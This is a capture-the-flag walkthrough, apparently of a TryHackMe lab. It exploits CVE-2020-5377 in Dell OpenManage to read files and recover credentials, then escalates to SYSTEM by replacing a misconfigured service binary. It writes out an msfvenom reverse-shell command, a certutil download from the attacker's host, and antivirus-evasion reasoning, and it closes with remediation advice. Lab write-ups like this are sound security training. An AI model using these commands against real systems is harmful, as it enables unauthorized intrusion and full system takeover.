🎯 Project Objective

The goal of this project was to gain unauthorized access to a server operated by the HackSmarterSec group, followed by privilege escalation to SYSTEM level and extraction of sensitive data (flags and a list of future targets).

The engagement focused heavily on proper enumeration, identifying non-standard services, and exploiting a real-world vulnerability in Dell OpenManage Server Administrator.

🧭 Phase 1. Enumeration
🔍 Nmap Scanning

The first step was to perform a full port and service scan against the target machine:

nmap -Pn -sC -sV -p- 10.81.151.53

📌 Discovered Open Ports:
Port	Service	Description
21	FTP	Anonymous access enabled
22	SSH	Remote login
80	HTTP	IIS Web Server
1311	HTTPS	Dell OpenManage
3389	RDP	Remote Desktop
🌐 Phase 2. Service Analysis
FTP (21)

Anonymous login was allowed

Discovered files:

Credit-Cards-We-Pawned.txt

stolen-passport.png

File analysis (including EXIF metadata) revealed no useful information
➡ Considered a dead end

HTTP (80)

Server identified as Microsoft IIS

A contact form was discovered

Basic XSS payloads were tested but no exploitation was possible

No critical vulnerabilities found

🔐 HTTPS (1311) — Primary Attack Vector

Upon inspecting port 1311, the following service was identified:

Dell EMC OpenManage Server Administrator
Version: 9.4.0.2


Accessed via:

https://<target-ip>:1311


This exposed the OpenManage web login portal.

🧨 Phase 3. Vulnerability Discovery & Exploitation
🔎 Version Fingerprinting

OMSA Version: 9.4.0.2

Apache Tomcat 9.0.21

Java Runtime Environment 11.0.7

🐞 Identified Vulnerability

CVE-2020-5377 – Arbitrary File Read

This vulnerability allows unauthenticated arbitrary file reading on vulnerable versions of Dell OpenManage Server Administrator.

⚙️ Exploiting CVE-2020-5377

The exploitation was performed using a Python PoC:

python3 CVE-2020-5377.py <ATTACKER_IP> <TARGET_IP>:1311

📂 Successfully Retrieved Files:
1️⃣ Proof of File Read:
C:\Windows\win.ini


✔ Successfully accessed

2️⃣ Sensitive Configuration File:
C:\inetpub\wwwroot\hacksmartersec\web.config


📄 Contents:

<add key="Username" value="tyler" />
<add key="Password" value="IAmA1337h4x0randIkn0wit!" />

🚪 Phase 4. Initial Foothold

The extracted credentials were used to establish an SSH session:

ssh tyler@hacksmarter.thm


Successful login was achieved as user tyler.

👤 Phase 5. User Flag

The user flag was located on the desktop:

C:\Users\tyler\Desktop\user.txt


📌 user.txt

THM{4ll15n0tw3llw1thd3ll}

🔼 Phase 6. Privilege Escalation Preparation

User tyler has limited privileges

systeminfo returned Access Denied

Windows Defender was active

Enumeration for privilege escalation began using PrivescCheck.ps1

A misconfigured service running as SYSTEM was identified (next phase)

🧠 Current Outcome

✔ Full enumeration completed
✔ Non-standard service identified (port 1311)
✔ Real-world CVE successfully exploited
✔ Initial foothold obtained
✔ User flag captured
➡ System fully prepared for privilege escalation to SYSTEM

PART2 

Attack Summary
During the penetration test, a vulnerability related to misconfigured access permissions for the Windows service spoofer-scheduler was discovered and successfully exploited. The service, running with LocalSystem privileges, allowed an unprivileged user to stop and start the service and overwrite its executable file.

Attack Stages
1. Reconnaissance and Vulnerability Discovery
Used the PrivescCheck script to enumerate potential attack vectors

Discovered the spoofer-scheduler service with the following characteristics:

Runs as LocalSystem (highest privileges)

Regular user has service control permissions (start/stop)

Executable file located in a writable directory: C:\Program Files (x86)\Spoofer\

2. Payload Preparation
Created a reverse shell using msfvenom:

bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.81.109.1 LPORT=443 -f exe -o spoofer-scheduler.exe
Ports 80/443 were selected to evade potential antivirus detection (standard HTTP/HTTPS ports)

Web server deployed on port 8080 for payload delivery

3. Vulnerability Exploitation
Stopping the target service:

cmd
sc stop spoofer-scheduler
Replacing the executable file:

cmd
certutil -urlcache -f http://10.81.109.1:8080/spoofer-scheduler.exe spoofer-scheduler.exe
Starting the service with replaced file:

cmd
sc start spoofer-scheduler
4. Access Acquisition
Successfully obtained reverse shell with SYSTEM privileges

Gained full system access with maximum privileges

5. Target Data Discovery and Extraction
Located target file: C:\Users\Administrator\Desktop\Hacking-Targets\hacking-targets.txt

Extracted information:

text
Next Victims:
CyberLens, WorkSmarter, SteelMountain
Technical Vulnerability Details
Vulnerability: Insecure Windows Service Permissions
Risk Level: High
CWE: CWE-250 (Execution with Unnecessary Privileges)
CVSS: 8.8 (High)

Exploitation Conditions:

User must be able to stop/start the service

Service executable directory must be writable

Antivirus software must not block file replacement

Conclusions and Recommendations
Critical Security Deficiencies:
Excessive Service Privileges:

Services not requiring SYSTEM rights should run under limited privilege accounts

Insecure Filesystem Permissions:

System service executable files should be protected from write access by regular users

Lack of Integrity Controls:

No digital signature or hash verification for executable files

Remediation Recommendations:
Change Service Account:

Create a dedicated account with minimal necessary privileges

Use Managed Service Accounts (gMSA) for automated password management

Strengthen Filesystem Permissions:

powershell
# Set appropriate ACLs on service directory
icacls "C:\Program Files (x86)\Spoofer" /inheritance:r
icacls "C:\Program Files (x86)\Spoofer" /grant "SYSTEM:(OI)(CI)F"
icacls "C:\Program Files (x86)\Spoofer" /grant "Administrators:(OI)(CI)F"
icacls "C:\Program Files (x86)\Spoofer" /deny "Users:(OI)(CI)W"
Implement Integrity Controls:

Implement digital signature verification for executable files

Use Windows Defender Application Control (WDAC)

Monitoring and Detection:

Configure auditing for service stop/start events (Event ID 7036)

Monitor changes in critical system directories

Implement EDR solutions for suspicious activity detection

Additional Measures:
Regular privilege and permission audits

Staff training on principle of least privilege

Implement change management processes for system software

Conclusion
The exploitation of this vulnerability demonstrates a classic example of vertical privilege escalation through misconfigured Windows services. The successful attack led to complete system compromise and access to confidential data. It is recommended to immediately address the identified deficiencies and implement the proposed security measures to prevent similar incidents in the future.


